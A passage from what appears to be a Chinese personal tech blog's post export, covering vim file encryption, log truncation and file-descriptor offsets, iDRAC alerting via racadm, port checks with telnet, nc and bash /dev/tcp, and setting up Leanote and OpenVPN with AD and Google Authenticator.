<h1 id="具体方法"><a href="#具体方法" class="headerlink" title="具体方法"></a>具体方法</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim -x &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<p>或者在 vim 编辑器里：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">X</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>需要注意的是缺省使用的加密方式是 zip，这个据说比较弱，所以我们通过修改自己的 .vimrc 来指定别的更强一些的加密方式，例如 blowfish(vim 7.3 以上版本支持) 或 blowfish2(vim 7.4 以上版本支持)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"set cryptmethod=blowfish"</span> &gt;&gt; ~/.vimrc</span><br></pre></td></tr></table></figure>
<p>或者直接命令行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim -x +<span class="string">"set cm=blowfish"</span> &lt;FILENAME&gt;</span><br></pre></td></tr></table></figure>
<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><ul>
<li>可以用 vim 来做密码管理器（结合密码文件放 git 上）</li>
</ul>
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>commandlinefu</tag>
        <tag>Vim</tag>
        <tag>cryptmethod</tag>
        <tag>blowfish</tag>
        <tag>zip</tag>
      </tags>
  </entry>
  <entry>
    <title>从一次用cat空文件到log文件来清log方法的失败说开去</title>
    <url>/2016/11/%E4%BB%8E%E4%B8%80%E6%AC%A1%E7%94%A8cat%E7%A9%BA%E6%96%87%E4%BB%B6%E5%88%B0log%E6%96%87%E4%BB%B6%E6%9D%A5%E6%B8%85log%E6%96%B9%E6%B3%95%E7%9A%84%E5%A4%B1%E8%B4%A5%E8%AF%B4%E5%BC%80%E5%8E%BB/index.html</url>
    <content><![CDATA[<h1 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h1><p>最近在“不务正业”，应老板需求，给我极的极 go 写一个插件，方便公司员工方便地登录 VPN。关于这个插件的事情另外单说，我这里主要讲下开发、调试这个插件期间发现的另外一个问题。</p>
<p>我在 OpenVPN 服务器上编写认证鉴权程序的时候，需要频繁查看 OpenVPN 的日志，我的 OpenVPN 日志文件是用参数 log 而非 log-append 指定的。</p>
<a id="more"></a>
<p>某日，我基于以下几个原因想把日志文件不停服务清一下：</p>
<ul>
<li>文件很大，不方便打开来看</li>
<li>日志打的很细，所以增长很快</li>
<li>自己要的日志特征也不明显，不方便用 grep 来过滤</li>
</ul>
<p>所以，基于 Linux 系统管理员的基本常识，直接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">: &gt; <span class="built_in">log</span>;</span><br></pre></td></tr></table></figure>
<p>但是当我 1 秒钟后（几乎也就是马上）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -l <span class="built_in">log</span>;</span><br></pre></td></tr></table></figure>
<p>发现这个文件的大小比清之前又大了一些！然后又做过几次测试，具体就不赘述了，反正现象就是：当清 log 的当时，文件大小是变为 0 了的，但是几乎是马上，文件立马又恢复到清之前的大小还大一点，仿佛就是跟没有执行清除 log 文件操作一样！</p>
<h1 id="分析原因"><a href="#分析原因" class="headerlink" title="分析原因"></a>分析原因</h1><p>最早我以为是内容没有及时刷到硬盘上的原因，于是在清日志操作前后加上了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sync;</span><br></pre></td></tr></table></figure>
<p>结果发现还是一样的。于是就大概网上扫了下，发现是日志文件 log 的打开方式所致。具体情况我们通过一点实验来演示下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 3&gt;<span class="built_in">log</span>;</span><br><span class="line"><span class="comment"># 用文件描述符33来打开文件 log</span></span><br><span class="line"><span class="built_in">printf</span> zzz &gt;&amp;3;</span><br><span class="line"><span class="comment"># 把字符串 "zzz" 写入文件描述符 33 打开的文件（也就是文件 log）</span></span><br><span class="line"><span class="comment"># 注意：此时的光标在文件的第四个位置（最右边那个字母 "z" 的右边）</span></span><br><span class="line">ls -l <span class="built_in">log</span>;od -c <span class="built_in">log</span>;</span><br><span class="line"><span class="comment"># 查看文件大小及其内容</span></span><br></pre></td></tr></table></figure>
<p>系统输出：</p>
<blockquote>
<p>-rw-r–r– 1 root root 3 Nov 23 16:00 log<br>0000000   z   z   z<br>0000003</p>
</blockquote>
<p>可以看到，文件 log 的大小是 3 字节、内容为 “zzz”，接着做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span> aaaa &gt;&gt; <span class="built_in">log</span>;</span><br><span class="line"><span class="comment"># 通过另外一个文件描述符打开文件 log，</span></span><br><span class="line"><span class="comment"># 并在其后追加了字符串 "aaaa"</span></span><br><span class="line"><span class="comment"># 注意：这里并没有修改文件描述符 3 光标的位置！</span></span><br><span class="line"><span class="comment"># 文件描述符 3 的光标还在第四个字符的位置</span></span><br><span class="line"><span class="comment"># 也就是最左边那个字符 "a" 的位置</span></span><br><span class="line">ls -l <span class="built_in">log</span>;od -c <span class="built_in">log</span>;</span><br><span class="line"><span class="comment"># 再次查看文件 log 的大小和内容</span></span><br></pre></td></tr></table></figure>
<p>系统输出：</p>
<blockquote>
<p>-rw-r–r– 1 root root 7 Nov 23 16:11 log<br>0000000   z   z   z   a   a   a   a<br>0000007</p>
</blockquote>
<p>由此可知现在文件 log 的大小为 7 字节，内容是 “zzzaaaa”，再接着做实验：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span> bb &gt;&amp;3;</span><br><span class="line"><span class="comment"># 在文件描述符 3 的光标位置开始写入字符串 "bb"</span></span><br><span class="line"><span class="comment"># 注意：写完后光标到了第 6 个字符的位置</span></span><br><span class="line"><span class="comment"># 也就是左边那个字符 "a" 的位置</span></span><br><span class="line">ls -l <span class="built_in">log</span>;od -c <span class="built_in">log</span>;</span><br><span class="line"><span class="comment"># 再次查看文件 log 的大小和内容</span></span><br></pre></td></tr></table></figure>
<p>系统输出：</p>
<blockquote>
<p>-rw-r–r– 1 root root 7 Nov 23 16:19 log<br>0000000   z   z   z   b   b   a   a<br>0000007</p>
</blockquote>
<p>表示此时文件 log 的大小没变，但是内容变成了 “zzzbbaa”，接着要清 log 了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">: &gt; <span class="built_in">log</span>;</span><br><span class="line"><span class="comment"># 清空文件 log 的内容</span></span><br><span class="line">ls -l <span class="built_in">log</span>;od -c <span class="built_in">log</span>;</span><br><span class="line"><span class="comment"># 看文件 log 的大小和内容</span></span><br></pre></td></tr></table></figure>
<p>系统输出：</p>
<blockquote>
<p>-rw-r–r– 1 root root 0 Nov 23 16:26 log<br>0000000</p>
</blockquote>
<p>可以看出，文件 log 的大小变为 0，内容是空的，再接着看如果此时再通过文件描述符 3 写入内容会怎么样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span> x &gt;&amp;3;</span><br><span class="line"><span class="comment"># 通过文件描述符 3 再次写入字符 "x"</span></span><br><span class="line">ls -l <span class="built_in">log</span>;od -c <span class="built_in">log</span>;</span><br><span class="line"><span class="comment"># 看文件 log 的大小和内容</span></span><br></pre></td></tr></table></figure>
<p>系统输出：</p>
<blockquote>
<p>-rw-r–r– 1 root root 6 Nov 23 16:32 log<br>0000000  \0  \0  \0  \0  \0   x<br>0000006</p>
</blockquote>
<p>看到没有，新写入的字符 “x” 直接写到了文件描述符 3 的光标位置，整个文件 log 的大小也还是通过文件描述符 3 写入的大小。这个实验应该完美地解释了前面我提到的日志文件的问题。实验最后，别忘了关闭文件描述符 3：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 3&gt;&amp;-;</span><br><span class="line">rm -f <span class="built_in">log</span>;</span><br></pre></td></tr></table></figure>
<h1 id="延展话题"><a href="#延展话题" class="headerlink" title="延展话题"></a>延展话题</h1><p>其实在 /proc 下能看到每个文件描述符打开文件时的参数，当然命令 <code>lsof</code> 也可以看到相关信息。来个实例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -nP +f g | grep -E <span class="built_in">log</span>$;</span><br></pre></td></tr></table></figure>
<p>基于敏感信息原因系统输出就不贴了，我只把输出大概讲一下：</p>
<ul>
<li>FILE-FLAG 列的 W 代表写入</li>
<li>FILE-FLAG 列的 AP 代表 O_APPEND</li>
<li>FILE-FLAG 列的 LG 代表 O_LARGEFILE</li>
</ul>
<p>可以看出，大部分日志的打开方式都是有 AP 字样的，也就是说打开时是有 O_APPEND 参数的，这种日志文件直接用 <code>:&gt;log</code> 清是没有问题的，但是 OpenVPN 的这几个日志文件就不带 AP，所以这些个日志文件是不能用 <code>:&gt;log</code> 来清。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://unix.stackexchange.com/questions/122929/emptying-a-file-without-disrupting-the-pipe-writing-to-it" target="_blank" rel="noopener">Emptying a file without disrupting the pipe writing to it</a></li>
</ul>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>Linux</tag>
        <tag>OpenVPN</tag>
        <tag>log</tag>
        <tag>log-append</tag>
        <tag>O_APPEND</tag>
        <tag>O_WRONLY</tag>
        <tag>O_LARGEFILE</tag>
      </tags>
  </entry>
  <entry>
    <title>使用racadm远程配置idrac卡自己通过smtp报警</title>
    <url>/2017/04/%E4%BD%BF%E7%94%A8racadm%E8%BF%9C%E7%A8%8B%E9%85%8D%E7%BD%AEidrac%E5%8D%A1%E8%87%AA%E5%B7%B1%E9%80%9A%E8%BF%87smtp%E6%8A%A5%E8%AD%A6/index.html</url>
    <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>减轻系统负担。对，目的就是为了减轻 dell 服务器的系统负担，因为如果 idrac 卡有问题会自己报警的话，那么系统里那一大堆耗资源的进程就都可以停掉了。</p>
<a id="more"></a>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>利用 dell 机器的工具：racadm。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">racadm -r 10.0.0.1 -u root -p calvin config \</span><br><span class="line">	-g cfgEmailAlert -o cfgEmailAlertEnable -i 1 1;</span><br><span class="line">racadm -r 10.0.0.1 -u root -p calvin config \</span><br><span class="line">	-g cfgEmailAlert -o cfgEmailAlertAddress -i 1 contacts@xxx.com;</span><br><span class="line">racadm -r 10.0.0.1 -u root -p calvin config \</span><br><span class="line">	-g 	cfgRemoteHosts -o cfgRhostsSmtpServerIpAddr 10.0.0.2;</span><br><span class="line"><span class="comment"># idarc 卡的 ip 是：10.0.0.1</span></span><br><span class="line"><span class="comment"># idarc 卡的用户名和密码是：root 和 calvin</span></span><br><span class="line"><span class="comment"># smtp server 的 ip 是：10.0.0.2</span></span><br><span class="line"><span class="comment"># 报警收件人是：contacts@xxx.com</span></span><br></pre></td></tr></table></figure>
<h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><p>既然谈到了 racadm，那么就直接再列几个常用用法吧</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 idarc 卡的配置写入文件 /tmp/xxx</span></span><br><span class="line">racadm -r 10.0.0.1 -u root -p calvin \</span><br><span class="line">	getconfig -f /tmp/xxx;</span><br><span class="line"><span class="comment"># 重启 idarc 卡所在服务器的操作系统</span></span><br><span class="line">racadm -r 10.0.0.1 -u root -p calvin \</span><br><span class="line">	serveraction powercycle;</span><br></pre></td></tr></table></figure>
<p>如果系统没有 racadm，那么怎么办呢？idarc 卡除了 web UI，还支持 ssh 访问，所以直接 ssh 连过去就是了。用帐号、密码登录之后再输入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">racadm serveraction powercycle;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>racadm</tag>
        <tag>idrac</tag>
        <tag>Dell</tag>
        <tag>monitor</tag>
        <tag>SMTP</tag>
      </tags>
  </entry>
  <entry>
    <title>分享一些自己DIY的Tasker的profile</title>
    <url>/2018/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%BA%9B%E8%87%AA%E5%B7%B1DIY%E7%9A%84task%E7%9A%84profile/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><h2 id="about-Tasker"><a href="#about-Tasker" class="headerlink" title="about Tasker"></a>about Tasker</h2><p>早先通过 <strong>Google Opinion Rewards</strong> 做调查挣了小几美刀，于是就购买了 <strong>Google Play Store</strong> 下的第一个收费软件：<a href="https://play.google.com/store/apps/details?id=net.dinglisch.android.taskerm&amp;hl=en_US" target="_blank" rel="noopener">Tasker</a>。但后来由于种种原因，<strong>Tasker</strong> 一直没有真正用起来（我最看重的几个功能都实现的不好）。</p>
<h2 id="about-IFTTT"><a href="#about-IFTTT" class="headerlink" title="about IFTTT"></a>about IFTTT</h2><p>一直在用 <strong>IFTTT</strong> 的一个功能：每日抓取 <strong>NASA</strong> 的图回来做 Android 手机的 Wallpaper，但最近同时用两个 Android 手机，不希望两个手机同时一样的 Wallpaper，但这个需求如果用 <strong>IFTTT</strong> 来做只能每台 Android 手机用单独的账号来实现，这个实现显然太丑陋了。</p>
<h1 id="最终方案"><a href="#最终方案" class="headerlink" title="最终方案"></a>最终方案</h1><p><strong>Tasker</strong> 官方其实有一个放出来的 profile，是来抓 <strong>reddit</strong> 的图的，但那是几年前的东西了，现在几乎没法用，但作为例子，这个 profile 处理这种问题的思路是可以借鉴的。于是我就修改了下这个 profile，实现了抓 reddit.com/r/wallpaper 和 reddit.com/r/pic 以及 <a href="https://www.nasa.gov/multimedia/imagegallery/iotd.html" target="_blank" rel="noopener">NASA iotd(Image of the Day)</a> 的功能。</p>
<h1 id="about-tasker-profile"><a href="#about-tasker-profile" class="headerlink" title="about tasker_profile"></a>about tasker_profile</h1><p>上面提到的这个 profile，我放到了 <a href="https://github.com/haw-haw/tasker_profile" target="_blank" rel="noopener">github</a> 下面了，这里远期还会放一些 <strong>Tasker</strong> 可用的、实现了一些实用好玩儿功能的 profile，但是暂时，就这么一个 profile，叫“Wallpaper”，意思是更系统 Wallpaper 相关的一个 profile。使用起来也不难，<a href="https://github.com/haw-haw/tasker_profile/blob/master/README.md" target="_blank" rel="noopener">README.md</a> 里都有提到。</p>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>如果我辛苦折腾的这个东西真能帮上你的忙，请帮我给项目点赞吧，谢谢！</p>
]]></content>
      <tags>
        <tag>Tasker</tag>
        <tag>profile</tag>
        <tag>Android</tag>
        <tag>Wallpaper</tag>
        <tag>reddit</tag>
        <tag>NASA</tag>
        <tag>iotd</tag>
      </tags>
  </entry>
  <entry>
    <title>命令行探测服务器某一端口是否打开</title>
    <url>/2017/04/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8E%A2%E6%B5%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9F%90%E4%B8%80%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%90%A6%E6%89%93%E5%BC%80/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>检测远程服务器的某一个端口（尤其是 tcp ）是否已经被打开，这貌似是 SA 们排错时遇到的一个常见场景，</p>
<a id="more"></a>
<h1 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h1><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>最早，我常用的方案是使用 telnet。估计那时也只有 telnet 可用：）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install telnet;</span><br><span class="line">telnet baidu.com 80;</span><br></pre></td></tr></table></figure>
<p>上面的命令正确连上以后会有输出：</p>
<blockquote>
<p>Trying 180.149.132.47…<br>Connected to baidu.com.<br>Escape character is ‘^]’.  </p>
</blockquote>
<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>后来，发现还有 nc，网络工具中的瑞士军刀：）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install nc;</span><br><span class="line">nc -vz baidu.com 80;</span><br></pre></td></tr></table></figure>
<p>成功后会提示：</p>
<blockquote>
<p>Connection to baidu.com 80 port [tcp/http] succeeded!</p>
</blockquote>
<p>仔细看上面的这句输出提示，看出来什么名堂没有？对啦：“tcp/http”！这么说 nc 还能检测 udp 端口不成？man 了一下，还真可以：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -vz -u 10.0.0.1 53</span><br></pre></td></tr></table></figure>
<p>成功以后系统提示：</p>
<blockquote>
<p>Connection to 10.0.0.1 53 port [udp/domain] succeeded!</p>
</blockquote>
<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><p>再后来，中老年如我，终于返璞归真，发现其实 bash 就直接支持这种检测。OK，废话少说，直接看命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man bash</span><br></pre></td></tr></table></figure>
<p>找到这几句提示：</p>
<blockquote>
<pre><code>/dev/tcp/host/port  
       If host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open a TCP  connection to the corresponding socket.
/dev/udp/host/port  
       If  host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open a UDP connection to the corresponding socket.
</code></pre></blockquote>
<p>故而测试命令很好玩儿：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;/dev/tcp/baidu.co/80;<span class="built_in">echo</span> $?;</span><br></pre></td></tr></table></figure>
<p>当成功连上 baidu.com 的 tcp 80 端口的时候，返回 0。</p>
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>tcp</tag>
        <tag>udp</tag>
        <tag>bash</tag>
        <tag>telnet</tag>
        <tag>nc</tag>
        <tag>port</tag>
      </tags>
  </entry>
  <entry>
    <title>在Ubuntu14.04上自建Leanote服务器</title>
    <url>/2016/12/%E5%9C%A8Ubuntu14-04%E4%B8%8A%E8%87%AA%E5%BB%BALeanote%E6%9C%8D%E5%8A%A1%E5%99%A8/index.html</url>
    <content><![CDATA[<h1 id="Why（为什么）"><a href="#Why（为什么）" class="headerlink" title="Why（为什么）"></a>Why（为什么）</h1><ol>
<li>前段时间 Evernote 限制了同时保持登录状态的设备数为 2</li>
<li>最近 WizNote（为知笔记）禁掉了免费用户的同步功能</li>
<li>有道云笔记测试时同步有问题，而且其文件格式相对封闭</li>
</ol>
<a id="more"></a>
<p>总而言之，为了避免下一次由于服务商服务协议变化而需要再次迁移数据，我选择了能自建服务器的 Leanote（蚂蚁笔记）。</p>
<h1 id="How-to（怎样）"><a href="#How-to（怎样）" class="headerlink" title="How to（怎样）"></a>How to（怎样）</h1><p>我们采用的是二进制安装的方式</p>
<h2 id="Prerequisite（环境准备）"><a href="#Prerequisite（环境准备）" class="headerlink" title="Prerequisite（环境准备）"></a>Prerequisite（环境准备）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get \</span><br><span class="line">	-y install \</span><br><span class="line">		screen \</span><br><span class="line">		wget \</span><br><span class="line">		tar \</span><br><span class="line">		gzip;</span><br></pre></td></tr></table></figure>
<h2 id="Leanote"><a href="#Leanote" class="headerlink" title="Leanote"></a>Leanote</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt;</span><br><span class="line">wget </span><br><span class="line">	-O leanote-linux-amd64-v2.1.bin.tar.gz \</span><br><span class="line">	https://sourceforge.net/projects/leanote-bin/files/2.1/leanote-linux-amd64-v2.1.bin.tar.gz/download;</span><br><span class="line">tar xzvf leanote-linux-amd64-v2.1.bin.tar.gz;</span><br></pre></td></tr></table></figure>
<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt;</span><br><span class="line">wget \</span><br><span class="line">	https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1404-3.4.0.tgz;</span><br><span class="line">tar xzvf \</span><br><span class="line">	mongodb-linux-x86_64-ubuntu1404-3.4.0.tgz;</span><br><span class="line">ln -s \</span><br><span class="line">	mongodb-linux-x86_64-ubuntu1404-3.4.0 mongodb;</span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/profile.d/mongodb1.sh</span><br><span class="line"><span class="built_in">export</span> PATH=\<span class="variable">$PATH</span>:/opt/mongodb/bin</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/mongodb.sh;</span><br></pre></td></tr></table></figure>
<h3 id="Import-data"><a href="#Import-data" class="headerlink" title="Import data"></a>Import data</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt;</span><br><span class="line">mkdir mongodb_data;</span><br><span class="line">screen -d \</span><br><span class="line">	-m mongod \</span><br><span class="line">	--dbpath /opt/mongodb_data;</span><br><span class="line">mongorestore \</span><br><span class="line">	-h localhost \</span><br><span class="line">	-d leanote \</span><br><span class="line">	--dir \</span><br><span class="line">		/opt/leanote/mongodb_backup/leanote_install_data/</span><br></pre></td></tr></table></figure>
<h2 id="Configuration（配置）"><a href="#Configuration（配置）" class="headerlink" title="Configuration（配置）"></a>Configuration（配置）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt;</span><br><span class="line">vim leanote/conf/app.conf</span><br><span class="line"><span class="comment"># 将 app.secret 的内容改若干个字符</span></span><br><span class="line"><span class="comment"># （注意：总长度需要一样）</span></span><br><span class="line"><span class="comment"># 将 site.url 改成我的具体情况，</span></span><br><span class="line"><span class="comment"># 比如：“http://note.xxx.com:9000”</span></span><br></pre></td></tr></table></figure>
<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/leanote/bin/;</span><br><span class="line">screen -d -m bash run.sh;</span><br></pre></td></tr></table></figure>
<h2 id="Test（测试）"><a href="#Test（测试）" class="headerlink" title="Test（测试）"></a>Test（测试）</h2><ul>
<li>打开浏览器访问：<a href="http://note.xxx.com:9000" target="_blank" rel="noopener">http://note.xxx.com:9000</a></li>
<li>用缺省帐号 admin（密码是 abc123）登录（尽快修改缺省密码！）</li>
</ul>
<p>能成功登录则证明基本上 Leanote server 部署成功。</p>
<h2 id="加入启动脚本"><a href="#加入启动脚本" class="headerlink" title="加入启动脚本"></a>加入启动脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">	<span class="string">"screen -d -m /opt/mongodb/bin/mongod --dbpath /opt/mongodb_data/"</span> \</span><br><span class="line">	&gt;&gt; /etc/rc.local;</span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">	<span class="string">"cd /opt/leanote/bin/;screen -d -m bash run.sh"</span> \</span><br><span class="line">	&gt;&gt; /etc/rc.local;</span><br></pre></td></tr></table></figure>
<h2 id="基本安全设置"><a href="#基本安全设置" class="headerlink" title="基本安全设置"></a>基本安全设置</h2><ol>
<li>修改 admin 的密码</li>
<li>禁掉 demo 用户</li>
<li>关掉注册功能</li>
<li>新建普通用户（用来正常使用，因为 admin 专做维护管理）</li>
</ol>
<h1 id="Appendix（附录）"><a href="#Appendix（附录）" class="headerlink" title="Appendix（附录）"></a>Appendix（附录）</h1><ul>
<li><a href="https://github.com/leanote/leanote/wiki/leanote-binary-installation-on-Mac-and-Linux-(En" target="_blank" rel="noopener">leanote binary installation on Mac and Linux (En)</a>)</li>
<li><a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-linux/" target="_blank" rel="noopener">Install MongoDB Community Edition From Tarball</a></li>
</ul>
]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Trusty Tahr</tag>
        <tag>Leanote</tag>
        <tag>蚂蚁笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>在OpenVPN上启用AD+Google Authenticator认证</title>
    <url>/2016/11/%E5%9C%A8OpenVPN%E4%B8%8A%E5%90%AF%E7%94%A8AD-google-authenicator%E8%AE%A4%E8%AF%81/index.html</url>
    <content><![CDATA[<h1 id="缘起-Why"><a href="#缘起-Why" class="headerlink" title="缘起(Why)"></a>缘起(Why)</h1><h2 id="现有环境"><a href="#现有环境" class="headerlink" title="现有环境"></a>现有环境</h2><ul>
<li>KVM</li>
<li>CentOS 6.x</li>
<li>OpenVPN 2.3.2</li>
<li>Google Authenticator libPAM 1.0.1</li>
<li>pam_ldap 185</li>
<li>Windows AD(2008R2)</li>
</ul>
<h2 id="来自老板的需求"><a href="#来自老板的需求" class="headerlink" title="来自老板的需求"></a>来自老板的需求</h2><ol>
<li>希望加强登录认证，仅仅靠原来的基于 AD 的认证还不够</li>
</ol>
<h2 id="老板认可的方案"><a href="#老板认可的方案" class="headerlink" title="老板认可的方案"></a>老板认可的方案</h2><ol>
<li>用 Google Authenticator 来做动态的二次认证</li>
<li>结合原有的 ldap 集中认证</li>
</ol>
<a id="more"></a>
<h1 id="具体步骤-Howto"><a href="#具体步骤-Howto" class="headerlink" title="具体步骤(Howto)"></a>具体步骤(Howto)</h1><h2 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h2><h3 id="制作google-authenticator的rpm包"><a href="#制作google-authenticator的rpm包" class="headerlink" title="制作google-authenticator的rpm包"></a>制作google-authenticator的rpm包</h3><ul>
<li>其实 epel 源里有 google-authenticator 的 rpm 包，但是那个太老了( 0.3?)，很多参数不支持，没法用。</li>
<li>随便一台 CentOS 6.x for x86_64 的机器上编都可以</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 准备打包的软件环境</span></span><br><span class="line">yum -y install git gcc \</span><br><span class="line">		libtool autoconf \</span><br><span class="line">		automake pam-devel \</span><br><span class="line">		rpm-build qrencode-libs;</span><br><span class="line"><span class="comment"># 抓取源代码，打包</span></span><br><span class="line">git <span class="built_in">clone</span> \</span><br><span class="line">	https://github.com/google/google-authenticator-libpam.git;</span><br><span class="line"><span class="built_in">cd</span> google-authenticator-libpam;</span><br><span class="line">./bootstrap.sh;</span><br><span class="line">./configure;</span><br><span class="line">make dist;</span><br><span class="line">cp google-authenticator-*.tar.gz ~/rpmbuild/SOURCES/;</span><br><span class="line"><span class="comment"># 上面这一步如果提示~/rpmbuild目录不存在</span></span><br><span class="line"><span class="comment"># 则先把下一步执行一次然后再试</span></span><br><span class="line"><span class="comment"># （下面这一步会确保有~/rpmbuild目录）</span></span><br><span class="line">rpmbuild -ba contrib/rpm.spec;</span><br><span class="line"><span class="comment"># 成功以后，编好的rpm包路径在：</span></span><br><span class="line"><span class="comment"># ~/rpmbuild/RPMS/x86_64/google-authenticator-1.*.el6.x86_64.rpm</span></span><br></pre></td></tr></table></figure>
<h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><p>在要跑 OpenVPN 服务的目标服务器上，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装前一步制作的google-authenticator的rpm包</span></span><br><span class="line">rpm -ivh google-authenticator-1.*.el6.x86_64.rpm;</span><br><span class="line">yum -y install openvpn \</span><br><span class="line">		pam_ldap \</span><br><span class="line">		openvpn-auth-ldap \</span><br><span class="line">		pamtester;</span><br><span class="line"><span class="comment"># 如果是新装的服务器（我这里自然不是），请别忘了装openvpn</span></span><br><span class="line"><span class="comment"># 上面的openvpn-auth-ldap和pamtester都不是必须要装的</span></span><br><span class="line"><span class="comment"># pamtester用来做一些pam认证的测试</span></span><br></pre></td></tr></table></figure>
<h3 id="配置软件"><a href="#配置软件" class="headerlink" title="配置软件"></a>配置软件</h3><h4 id="etc-pam-ldap-conf"><a href="#etc-pam-ldap-conf" class="headerlink" title="/etc/pam_ldap.conf"></a>/etc/pam_ldap.conf</h4><p>这是 CentOS 6.x 下 pam_ldap.so 的配置文件，因为我们后面在 OpenVPN 的 pam 认证里会用 pam_ldap.so 来从 AD 认证，所以这里我们需要先把这个配置好。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># host 定义的是域控的 ip</span></span><br><span class="line"><span class="comment"># 可以多写几个</span></span><br><span class="line"><span class="comment"># 用空格分开即可</span></span><br><span class="line"><span class="comment"># 请根据实际情况填写</span></span><br><span class="line">host 10.0.0.1</span><br><span class="line"><span class="comment"># base 写的是用户的 basedn</span></span><br><span class="line"><span class="comment"># 这个需要根据具体情况修改</span></span><br><span class="line">base ou=staff,dc=xxx,dc=com</span><br><span class="line"><span class="comment"># binddn 是用来搜索 AD 域的帐号</span></span><br><span class="line">binddn CN=xxx_ldap,OU=access account,OU=staff,DC=xxx,DC=com</span><br><span class="line"><span class="comment"># bindpw 是搜索 AD 域的帐号的密码</span></span><br><span class="line">bindpw passwordxxx</span><br><span class="line"><span class="comment"># pam_filter 可以设一些允许连接 OpenVPN 服务的条件</span></span><br><span class="line"><span class="comment"># 我司这里用了一个允许拨入的条件</span></span><br><span class="line"><span class="comment"># 这个不是必须的</span></span><br><span class="line">pam_filter msNPAllowDialin=TRUE</span><br><span class="line"><span class="comment"># pam_login_attribute 是来设定 AD 